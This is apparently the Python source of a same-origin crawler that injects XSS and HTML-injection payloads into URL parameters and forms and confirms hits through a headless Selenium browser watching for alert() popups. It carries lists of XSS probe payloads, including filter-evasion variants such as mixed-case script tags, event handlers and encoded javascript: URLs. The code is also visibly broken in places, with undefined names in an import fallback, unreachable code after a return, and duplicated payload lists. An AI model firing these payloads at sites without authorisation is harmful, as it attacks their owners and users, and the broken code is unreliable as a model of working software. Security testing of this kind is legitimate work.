
"""
Scanner
-------
- Crawls within the same origin (breadth‑first).
- Probes inputs and query params for **XSS** and **HTML injection**.
- Confirms infection using an **optional Selenium verifier**:
  * XSS: looks for a real JS alert popup after payload submission.
  * HTML inj: checks if raw HTML tag is rendered in DOM (not escaped).
- Skips login/registration pages for active testing, but still lists them in results.
- Keeps code clean and commented.
"""

from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, urlencode, urlsplit, parse_qsl
from collections import deque
from bs4 import BeautifulSoup
import requests, time, re

# Optional: runtime verification via Selenium
# Ensure types are properly defined for static analysis
from typing import Optional, Union, Dict, Any, cast
from types import ModuleType
from selenium import webdriver as selenium_webdriver
from selenium.webdriver.common.by import By as SeleniumBy
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.remote.webelement import WebElement

# Initialize selenium components
_HAVE_SELENIUM = True
try:
    webdriver = selenium_webdriver
    Options = ChromeOptions
    By = SeleniumBy
except ImportError:
    _HAVE_SELENIUM = False
    webdriver = cast(ModuleType, None) 
    Options = cast(Any, None)
    By = cast(Any, None)
    webdriver = _webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import NoAlertPresentException
    _HAVE_SELENIUM = True
except Exception:
    webdriver = None
    # Keep type hints working without Selenium
    webdriver = cast(ModuleType, None)
    Options = cast(Any, None)
    By = cast(Any, None)
    _HAVE_SELENIUM = False

# Regular expressions for identifying sensitive pages
LOGIN_RX = re.compile(
    r"(login|log-?in|sign-?in|register|sign-?up|auth|account|password|reset|recover|verify|profile|dashboard|admin)", 
    re.I  # Case insensitive
)

@dataclass
class Finding:
    """Represents a security finding from the scanner"""
    type: str           # 'xss_reflected' | 'html_injection'
    page: str           # page tested
    attack_url: str     # url used for attack (GET) or target action (POST)
    method: str         # GET | POST
    vector: str         # 'param' | 'form'
    param: str          # parameter name
    payload: str        # payload string used
    evidence: str       # brief evidence summary
    status: int         # HTTP status code from response

class _Verifier:
    """Wraps Selenium WebDriver to verify vulnerabilities through runtime testing"""
    driver: Optional[WebDriver]
    base_url: str
    
    def __init__(self, base_url: str) -> None:
        """Initialize verifier with base URL."""
        self.driver = None
        self.base_url = base_url

    def _ensure(self) -> None:
        """Initialize WebDriver if needed."""
        if self.driver is None and _HAVE_SELENIUM and webdriver is not None and Options is not None:
            opts = Options()
            # Modern headless mode
            opts.add_argument("--headless=new")
            # Security options
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-extensions")
            # Performance options
            opts.add_argument("--disable-gpu")
            opts.add_argument("--disable-dev-shm-usage")
            # Privacy options
            opts.add_argument("--incognito")
            self.driver = webdriver.Chrome(options=opts)

    def close(self) -> None:
        """Clean up WebDriver resources."""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

    def verify_xss_alert(self, url: str) -> bool:
        """
        Verify XSS by checking for JavaScript alert() execution.
        
        Args:
            url: The URL to test
            
        Returns:
            bool: True if XSS is confirmed via alert dialog
        """
        if not _HAVE_SELENIUM:
            return False
            
        self._ensure()
        driver = self.driver
        if driver is None:
            return False
            
        try:
            # Load page with increased timeout for JS
            driver.get(url)
            time.sleep(1.2)
            
            try:
                # Check for alert presence and content
                alert = driver.switch_to.alert
                alert_text = alert.text
                
                # Try to accept alert, ignoring errors
                try:
                    alert.accept()
                except Exception:
                    pass
                    
                return bool(alert_text)
                
            except NoAlertPresentException:
                return False
                
        except Exception as e:
            print(f"XSS verification error for {url}: {str(e)}")
            return False
            
        finally:
            # Cleanup: clear any remaining alerts
            if driver is not None:
                try:
                    alert = driver.switch_to.alert
                    alert.accept()
                except Exception:
                    pass
                
    # Enhanced XSS test payloads
    XSS_PAYLOADS = [
        # Basic alert test
        '"><script>alert(1)</script>',
        # HTML attributes with JS
        '" onmouseover="alert(1)"',
        "' onclick='alert(1)'",
        # Protocol handlers
        'javascript:alert(1)',
        # HTML encoding bypass
        '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
        # Script tag variations
        '<script>alert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        # Event handler variations
        '" onload="alert(1)',
        '" onerror="alert(1)',
        '" onfocus="alert(1)',
        # More complex payloads
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        # Template injection
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
        # Base tag injection
        '"><base href="javascript:alert(1)//"'
    ]
    
    # Enhanced HTML injection test payloads
    HTML_PAYLOADS = [
        # Basic tag tests
        '<b>HTML-INJECTION-TEST</b>',
        '<i>HTML-INJECTION-TEST</i>',
        # Image tag tests
        '<img src="x" alt="HTML-INJECTION-TEST">',
        # Style attribute tests
        '<span style="color:red">HTML-INJECTION-TEST</span>',
        # Link tests
        '<a href="#">HTML-INJECTION-TEST</a>',
        # Complex nested tags
        '<div><p><b>HTML-INJECTION-TEST</b></p></div>',
        # Table elements
        '<table><tr><td>HTML-INJECTION-TEST</td></tr></table>',
        # Form elements
        '<input value="HTML-INJECTION-TEST">',
        # Custom data attributes
        '<div data-test="HTML-INJECTION-TEST">test</div>',
        # CSS class injection
        '<div class="HTML-INJECTION-TEST">test</div>'
    ]

    def verify_html_injection(self, url: str, tag_check: str = "<b>HTML-INJECTION-TEST</b>") -> bool:
        """
        Verify HTML injection by confirming tag is rendered in DOM.
        
        Args:
            url: URL to test
            tag_check: HTML tag to verify, defaults to test marker
            
        Returns:
            bool: True if HTML injection is confirmed
        """
        if not _HAVE_SELENIUM:
            return False
            
        self._ensure()
        driver = self.driver
        if driver is None:
            return False
            
        try:
            # Load page and wait for rendering
            driver.get(url)
            time.sleep(1.0)  # Increased wait time
            
            # Get rendered page source
            src = driver.page_source
            if not src:
                return False
                
            # Normalize for comparison
            src_lower = src.lower()
            tag_lower = tag_check.lower()
            
            # Multi-step verification:
            # 1. Check for unescaped tag presence
            tag_present = tag_lower in src_lower
            not_escaped = "&lt;" not in src and "&gt;" not in src
            
            # 2. Try finding rendered elements
            if By is not None:
                try:
                    # Look for elements with our test marker
                    if "HTML-INJECTION-TEST" in tag_check:
                        xpath = "//*[contains(text(),'HTML-INJECTION-TEST')]"
                        elements = driver.find_elements(By.XPATH, xpath)
                        if elements:
                            return True
                            
                    # Check specific tag types
                    if tag_check.startswith('<b>'):
                        elements = driver.find_elements(By.TAG_NAME, 'b')
                        if elements:
                            return True
                    elif tag_check.startswith('<i>'):
                        elements = driver.find_elements(By.TAG_NAME, 'i')
                        if elements:
                            return True
                            
                except Exception:
                    pass
                    
            return tag_present and not_escaped
            
        except Exception as e:
            print(f"HTML injection verification error for {url}: {str(e)}")
            return False
            # Always try to clear any remaining alerts
            try:
                alert = d.switch_to.alert
                alert.accept()
            except Exception:
                pass

    def confirm_xss_alert(self, url: str) -> bool:
        """
        Verify XSS by checking for JavaScript alert() execution.
        
        Args:
            url: The URL to test
            
        Returns:
            bool: True if XSS is confirmed via alert
        """
        if not _HAVE_SELENIUM or self.driver is None:
            return False
            
        self._ensure()
        d = cast(WebDriver, self.driver)  # Safe cast after _ensure()
        
        try:
            # Load page and wait for JavaScript
            d.get(url)
            time.sleep(1.2)  # Increased wait for slow JS
            
            try:
                # Check for alert and capture text
                alert = d.switch_to.alert
                alert_text = alert.text
                
                # Always try to accept/dismiss alert
                try:
                    alert.accept()
                except:  # Ignore accept errors
                    pass
                    
                return bool(alert_text)  # True if alert had text
                
            except NoAlertPresentException:
                return False
                
        except Exception as e:
            print(f"XSS verification error for {url}: {str(e)}")
            return False
            
        finally:
            # Cleanup: ensure no alerts remain
            try:
                alert = d.switch_to.alert
                alert.accept()
            except:
                pass

class Scanner:
    """
    Enhanced security scanner with precise vulnerability verification.
    
    XSS Detection:
    - Confirms vulnerabilities via real JavaScript execution
    - Verifies alert() dialog box appearance
    - Multiple injection vectors and contexts
    - Skips login/registration pages entirely
    
    HTML Injection Detection:
    - Verifies actual HTML tag rendering
    - Checks DOM for unescaped tags
    - Confirms visual changes in the page
    """
    
    # Enhanced XSS test payloads with evasion techniques
    XSS_PAYLOADS = [
        # Basic script injection with variations
        '<script>alert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '"><script>alert(1)</script>',
        # HTML events with different quotes
        '" onmouseover="alert(1)"',
        "' onclick='alert(1)'",
        '"><a onmouseover="alert(1)">hover</a>',
        # Protocol handlers
        'javascript:alert(1)//',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        # Element injection with events
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<video src=x onerror=alert(1)>',
        # Input focus events
        '" onfocus="alert(1)" autofocus "',
        '" onfocusin="alert(1)" autofocus "',
        # Complex DOM manipulation
        '";document.body.innerHTML=\'<img src=x onerror=alert(1)>\';//',
        # Template injection
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
        # Unicode escapes
        'java\u0073cript:alert(1)',
        '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)',
        # Modern payload variations
        '<details ontoggle="alert(1)">',
        '<select autofocus onfocus=alert(1)>'
    ]
    
    # Enhanced HTML injection tests with visual confirmation
    HTML_PAYLOADS = [
        # Basic confirmation
        '<b id="test-inj">HTML-INJECTION-TEST</b>',
        '<i class="test-inj">HTML-INJECTION-TEST</i>',
        # Styled elements
        '<div style="background:yellow;color:red;padding:10px">HTML-INJECTION-TEST</div>',
        '<span style="border:2px solid red;display:block">HTML-INJECTION-TEST</span>',
        # Table structures
        '<table border=1><tr><td bgcolor=yellow>HTML-INJECTION-TEST</td></tr></table>',
        # Form elements
        '<input type=text value="HTML-INJECTION-TEST">',
        '<textarea>HTML-INJECTION-TEST</textarea>',
        # Lists
        '<ul><li style="color:red">HTML-INJECTION-TEST</li></ul>',
        # Advanced styling
        '<div style="transform:rotate(5deg);color:red">HTML-INJECTION-TEST</div>',
        # Custom data attributes
        '<div data-testid="injection">HTML-INJECTION-TEST</div>',
        # Nested structures
        '<div><p><b>HTML-INJECTION-TEST</b></p></div>',
        # Modern elements
        '<details open><summary>HTML-INJECTION-TEST</summary></details>',
        '<marquee>HTML-INJECTION-TEST</marquee>',
        # CSS classes
        '<p class="html-injection-test">HTML-INJECTION-TEST</p>'
    ]

    def __init__(self, base_url: str, max_pages: int = 20, 
                 timeout: int = 8, progress_cb = None, 
                 respect_robots: bool = True,
                 requests_per_second: float = 2.0) -> None:
        """
        Initialize scanner with configuration.
        
        Args:
            base_url: Starting URL to scan
            max_pages: Maximum pages to scan
            timeout: Request timeout in seconds
            progress_cb: Optional callback for progress updates
            respect_robots: Whether to respect robots.txt
            requests_per_second: Rate limit for requests
        """
        self.base_url = base_url.rstrip("/")
        self.netloc = urlparse(self.base_url).netloc
        self.max_pages = max_pages
        self.timeout = timeout
        self.requests_per_second = requests_per_second
        self.last_request_time = 0.0  # For rate limiting
        self.progress_cb = progress_cb or (lambda *a, **k: None)
        self.seen = set()
        self.findings: list[Finding] = []
        self.session = requests.Session()
        self.verifier = _Verifier(self.base_url)

    def _same_origin(self, u: str) -> bool:
        try: return urlparse(u).netloc == self.netloc
        except Exception: return False

    def _should_skip_active(self, url: str) -> bool:
        # Skip login & registration pages for active testing, but still enqueue / record
        return bool(LOGIN_RX.search(url))

    def _wait_for_rate_limit(self) -> None:
        """
        Enforce request rate limiting to prevent overwhelming target.
        """
        if self.requests_per_second <= 0:
            return
            
        now = time.time()
        min_interval = 1.0 / self.requests_per_second
        elapsed = now - self.last_request_time
        
        if elapsed < min_interval:
            time.sleep(min_interval - elapsed)
            
        self.last_request_time = time.time()

    def _fetch(self, url: str) -> Optional[requests.Response]:
        """
        Make an HTTP request with rate limiting and error handling.
        
        Args:
            url: The URL to request
            
        Returns:
            Optional[Response]: Response object or None on error
        """
        try:
            # Apply rate limiting
            self._wait_for_rate_limit()
            
            # Make request with proper error handling
            r = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=True,
                verify=True  # Verify SSL certificates
            )
            
            # Update rate limiting timestamp
            self.last_request_time = time.time()
            
            # Check for successful response
            r.raise_for_status()
            return r
            
        except requests.exceptions.SSLError:
            print(f"SSL certificate verification failed for {url}")
            return None
        except requests.exceptions.ConnectionError:
            print(f"Connection failed for {url}")
            return None
        except requests.exceptions.Timeout:
            print(f"Request timed out for {url}")
            return None
        except requests.exceptions.TooManyRedirects:
            print(f"Too many redirects for {url}")
            return None
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {url}: {str(e)}")
            return None
        except Exception as e:
            print(f"Unexpected error fetching {url}: {str(e)}")
            return None
            return None

    def crawl(self):
        q = deque([self.base_url])
        self.seen.add(self.base_url)
        pages = 0

        while q and pages < self.max_pages:
            url = q.popleft()
            pages += 1
            # Report progress as (done, total) to match callers that expect numeric progress
            try:
                self.progress_cb(pages, self.max_pages)
            except TypeError:
                # Backwards compatibility: some callbacks may accept a single message string
                # In that case, call with a human-readable message.
                try:
                    self.progress_cb(f"Visiting {url}")
                except Exception:
                    # Ignore any callback errors to avoid breaking the scan
                    pass
            r = self._fetch(url)
            if not r or not r.text: 
                continue

            soup = BeautifulSoup(r.text, "html.parser")
            # Enqueue same-origin links with type safety
            for a in soup.find_all("a", href=True):
                href = a.get("href", "")  # Safe access with default
                if not isinstance(href, str):
                    continue  # Skip if not a string
                nxt = urljoin(url, href)
                if isinstance(nxt, str) and nxt not in self.seen and self._same_origin(nxt):
                    self.seen.add(nxt)
                    q.append(nxt)

            # Probe this page (except active testing for login/register)
            self._probe_page(url, soup, r.status_code, allow_active=not self._should_skip_active(url))

        self.verifier.close()

    def _probe_page(self, url: str, soup: BeautifulSoup, status: int, allow_active: bool) -> None:
        """
        Test a page for XSS and HTML injection vulnerabilities
        
        Args:
            url: The page URL to test
            soup: Parsed BeautifulSoup object
            status: HTTP status code
            allow_active: Whether to perform active testing
        """
        # 1) GET param tests
        parsed = urlsplit(url)
        params = dict(parse_qsl(parsed.query))
        for key in list(params.keys())[:4]:  # Limit param tests
            base = url.split("?")[0]
            if allow_active:
                # Test XSS payloads with improved verification
                for p in self.XSS_PAYLOADS:
                    # Construct test URL with payload
                    test = base + "?" + urlencode({**params, key: p})
                    rr = self._fetch(test)
                    if not rr or not rr.text:
                        continue
                        
                    # Multi-stage XSS verification
                    is_xss = False
                    evidence = ""
                    
                    # Stage 1: Check for alert() execution
                    # Stage 1: Check for alert() execution
                    if self.verifier.verify_xss_alert(test):
                        is_xss = True
                        evidence = "Alert box detected and confirmed"
                        
                    # Stage 2: Check for payload reflection and context
                    elif rr.text and p in rr.text:
                        reflection_pos = rr.text.find(p)
                        if reflection_pos > -1:
                            # Extract surrounding context
                            ctx_start = max(0, reflection_pos - 50)
                            ctx_end = min(len(rr.text), reflection_pos + len(p) + 50)
                            context = rr.text[ctx_start:ctx_end]
                            
                            # Look for dangerous contexts with JS execution potential
                            if any(x in context.lower() for x in [
                                "<script", "javascript:", "onerror=", "onload=",
                                "onmouseover=", "onfocus=", "onmouseenter=",
                                "onkeypress=", "onclick=", "data-"
                            ]):
                                is_xss = True
                                evidence = "Payload reflected in dangerous context"
                            else:
                                evidence = "Payload reflected (no alert/context)"
                                
                    if is_xss:
                        self.findings.append(Finding("xss_reflected", url, test, "GET", "param", key, p, evidence, rr.status_code))
                
                # Test HTML injection payloads with improved detection
                for p in self.HTML_PAYLOADS:
                    test = base + "?" + urlencode({**params, key: p})
                    rr = self._fetch(test)
                    if not rr or not rr.text:
                        continue
                        
                    # Multi-stage HTML injection verification
                    is_html_inj = False
                    evidence = ""
                    
                    # Stage 1: Check for rendered tag
                    if self.verifier.verify_html_injection(test, tag_check=p):
                        is_html_inj = True
                        evidence = "HTML tag rendered and confirmed in DOM"
                        
                    # Stage 2: Check unescaped reflection
                    elif p in rr.text:
                        # Verify not escaped
                        if all(x not in rr.text for x in ["&lt;", "&gt;", "&amp;"]):
                            is_html_inj = True
                            evidence = "HTML tag reflected unescaped"
                        else:
                            evidence = "Tag reflected but escaped"
                            
                    if is_html_inj:
                        self.findings.append(Finding("html_injection", url, test, "GET", "param", key, p, evidence, rr.status_code))

        # 2) FORM tests (limit forms to test)
        forms = soup.find_all("form")[:4]
        for form in forms:
            # Get form attributes with type safety
            method_attr = form.get("method", "")
            action_attr = form.get("action", "")
            
            # Convert to strings safely
            method = str(method_attr).lower() if method_attr else "get"
            action = urljoin(url, str(action_attr)) if action_attr else url
            inputs = form.find_all(["input","textarea","select"])[:5]
            fields = {}
            for inp in inputs:
                name = inp.get("name") or inp.get("id") or ""
                if not name: continue
                if inp.get("type") in ("submit","button","hidden"): 
                    continue
                fields[name] = "test"
            if not fields:
                continue

            if not allow_active:
                continue  # Skip active testing on sensitive pages

            # Test fields with improved verification
            for key in list(fields.keys())[:3]:
                # XSS Testing
                for p in self.XSS_PAYLOADS:
                    send = {**fields, key: p}
                    try:
                        if method == "post":
                            rr = self.session.post(action, data=send, timeout=self.timeout, allow_redirects=True)
                            attack_url = action
                        else:
                            rr = self.session.get(action, params=send, timeout=self.timeout, allow_redirects=True)
                            attack_url = rr.url
                            
                        if not rr or not rr.text:
                            continue
                            
                        # Multi-stage XSS verification
                        is_xss = False
                        evidence = ""
                        
                        # Stage 1: Check for alert execution
                        if self.verifier.verify_xss_alert(attack_url):
                            is_xss = True
                            evidence = "Alert box detected and confirmed"
                            
                        # Stage 2: Check payload reflection
                        elif p in rr.text:
                            reflection_pos = rr.text.find(p)
                            if reflection_pos > -1:
                                # Check surrounding context
                                ctx_start = max(0, reflection_pos - 50)
                                ctx_end = min(len(rr.text), reflection_pos + len(p) + 50)
                                context = rr.text[ctx_start:ctx_end]
                                
                                # Look for dangerous contexts
                                if any(x in context.lower() for x in [
                                    "<script", "javascript:", "onerror=", "onload=",
                                    "onmouseover=", "onfocus=", "onmouseenter=",
                                    "onkeypress=", "onclick=", "data-"
                                ]):
                                    is_xss = True
                                    evidence = f"Payload reflected in dangerous context: {context}"
                                else:
                                    evidence = "Payload reflected (no alert/context)"
                                    
                        if is_xss:
                            self.findings.append(Finding(
                                "xss_reflected", url, attack_url,
                                method.upper(), "form", key, p,
                                evidence, rr.status_code
                            ))
                            
                    except Exception as e:
                        print(f"Error testing form XSS on {url}: {str(e)}")
                        continue

                # Then HTML injection
                for p in self.HTML_PAYLOADS:
                    send = {**fields, key: p}
                    try:
                        if method == "post":
                            rr = self.session.post(action, data=send, timeout=self.timeout); attack_url = action
                        else:
                            rr = self.session.get(action, params=send, timeout=self.timeout); attack_url = rr.url
                        if self.verifier.verify_html_injection(attack_url, tag_check=p):
                            self.findings.append(Finding("html_injection", url, attack_url, method.upper(), "form", key, p, "Tag rendered in DOM", rr.status_code))
                        elif p in (rr.text or "") and ("&lt;" not in rr.text and "&gt;" not in rr.text):
                            self.findings.append(Finding("html_injection", url, attack_url, method.upper(), "form", key, p, "Tag reflected unescaped", rr.status_code))
                    except Exception:
                        pass
